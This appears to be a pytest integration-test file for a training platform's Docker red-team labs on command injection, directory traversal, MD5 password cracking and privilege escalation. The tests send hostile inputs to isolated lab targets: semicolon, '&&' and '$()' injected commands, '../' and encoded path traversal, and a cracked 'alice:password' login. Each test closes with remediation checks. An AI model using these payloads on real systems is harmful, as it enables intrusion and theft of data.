"""
Genuine Docker Lab Integration Tests for Red Team Rooms 14–17:
- Room 14: Command Injection (red-14-command-injection)
- Room 15: Directory Traversal (red-15-directory-traversal)
- Room 16: Password Security & Key Stretching (red-16-password-security)
- Room 17: Privilege Escalation Fundamentals (red-17-privilege-escalation)

Tests live container duo communicating over isolated internal bridge network.
"""

import pytest
from backend.app.labs.docker_runner import DockerLabRunner


@pytest.fixture(scope="module")
def docker_runner():
    runner = DockerLabRunner()
    if not runner.is_available():
        pytest.skip("Docker daemon is not operational on this host. Skipping Docker lab tests.")
    return runner


@pytest.mark.asyncio
async def test_docker_room_14_command_injection(docker_runner):
    """Room 14: Ping semicolon injection, DNS command chaining, breakout challenge, safe API remediation."""
    session_id = "test_docker_room_14_live"
    info = await docker_runner.start_session(session_id, "red-14-command-injection", "op-tester-14")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Diagnostic ping probe with semicolon injection
        ping_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8095/api/diagnostics/ping?host=127.0.0.1%3Bid"'
        )
        assert "NOENTRY{cmd_injection_shell_metachars_8192}" in ping_out

        # 2. DNS query with logical AND command chaining
        dns_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8095/api/diagnostics/dns?domain=target.noentry.internal%26%26whoami"'
        )
        assert "NOENTRY{cmd_injection_command_chain_3391}" in dns_out

        # 3. Metacharacter breakout challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8095/challenge?probe=127.0.0.1%24(whoami)"'
        )
        assert "NOENTRY{cmd_injection_operator_master_7140}" in chal_out

        # 4. Remediation POST enforcing safe API argument vector
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8095/api/remediate"
        )
        assert "NOENTRY{cmd_injection_safe_api_remediated_5521}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_15_directory_traversal(docker_runner):
    """Room 15: Relative vault traversal, arbitrary file download, URL-encoded traversal challenge, canonical path remediation."""
    session_id = "test_docker_room_15_live"
    info = await docker_runner.start_session(session_id, "red-15-directory-traversal", "op-tester-15")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Relative path traversal to confidential vault
        view_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8096/api/files/view?file=../../vault/recovery.key"'
        )
        assert "NOENTRY{dir_traversal_dot_dot_slash_4102}" in view_out

        # 2. Arbitrary file download
        dl_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8096/api/files/download?file=/etc/telemetry.log"'
        )
        assert "NOENTRY{dir_traversal_arbitrary_file_read_9318}" in dl_out

        # 3. URL-encoded traversal challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8096/challenge?doc=%2e%2e%2fsecret"'
        )
        assert "NOENTRY{dir_traversal_encoding_bypass_7749}" in chal_out

        # 4. Remediation POST enforcing Path.resolve() canonicalization and boundary checks
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8096/api/remediate"
        )
        assert "NOENTRY{dir_traversal_canonical_path_secured_2810}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_16_password_security(docker_runner):
    """Room 16: Local hash inspect, legacy MD5 dump, cracked credential authentication, key stretching challenge, salted bcrypt remediation."""
    session_id = "test_docker_room_16_live"
    info = await docker_runner.start_session(session_id, "red-16-password-security", "op-tester-16")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Inspect hashes on operator workstation
        hashes_out = await docker_runner.execute_command(session_id, "cat /home/operator/hashes/hashes.txt")
        assert "5f4dcc3b5aa765d61d8327deb882cf99" in hashes_out

        # 2. Dump legacy user hashes
        dump_out = await docker_runner.execute_command(session_id, f"curl -s http://{target_ip}:8097/api/users/dump")
        assert "NOENTRY{pwd_sec_plaintext_md5_cracked_8912}" in dump_out

        # 3. Authenticate with cracked password (alice:password)
        ver_out = await docker_runner.execute_command(
            session_id,
            f'curl -s -X POST http://{target_ip}:8097/api/verify -H "Content-Type: application/json" -d \'{{"username":"alice","password":"password"}}\''
        )
        assert "NOENTRY{pwd_sec_hash_collision_breach_3419}" in ver_out

        # 4. Key stretching challenge
        chal_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8097/challenge?algorithm=bcrypt"'
        )
        assert "NOENTRY{pwd_sec_key_stretching_master_6601}" in chal_out

        # 5. Remediation POST enforcing salted bcrypt
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8097/api/remediate"
        )
        assert "NOENTRY{pwd_sec_salted_bcrypt_hardened_4418}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)


@pytest.mark.asyncio
async def test_docker_room_17_privilege_escalation(docker_runner):
    """Room 17: Local audit script, system SUID audit endpoint, sudo check, SUID elevation simulation, sudoers remediation."""
    session_id = "test_docker_room_17_live"
    info = await docker_runner.start_session(session_id, "red-17-privilege-escalation", "op-tester-17")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    target_ip = info.target_ip

    try:
        # 1. Run local audit script on attacker workstation
        audit_sh_out = await docker_runner.execute_command(session_id, "sh /home/operator/tools/privesc_audit.sh")
        assert "backup_helper" in audit_sh_out

        # 2. Query system audit endpoint
        audit_api_out = await docker_runner.execute_command(session_id, f"curl -s http://{target_ip}:8098/api/system/audit")
        assert "NOENTRY{privesc_permission_audit_discovered_9012}" in audit_api_out

        # 3. Sudo rights verification for backup_svc
        sudo_out = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{target_ip}:8098/api/sudo/check?user=backup_svc"'
        )
        assert "NOENTRY{privesc_sudo_nopasswd_misconfig_7821}" in sudo_out

        # 4. Trigger elevated simulation
        esc_out = await docker_runner.execute_command(
            session_id,
            f'curl -s -X POST http://{target_ip}:8098/api/escalate/simulate -H "Content-Type: application/json" -d \'{{"command":"whoami"}}\''
        )
        assert "NOENTRY{privesc_suid_boundary_breach_5194}" in esc_out

        # 5. Sudoers and SUID hardening remediation
        rem_out = await docker_runner.execute_command(
            session_id,
            f"curl -s -X POST http://{target_ip}:8098/api/remediate"
        )
        assert "NOENTRY{privesc_sudoers_hardened_secured_8892}" in rem_out

    finally:
        await docker_runner.stop_session(session_id)

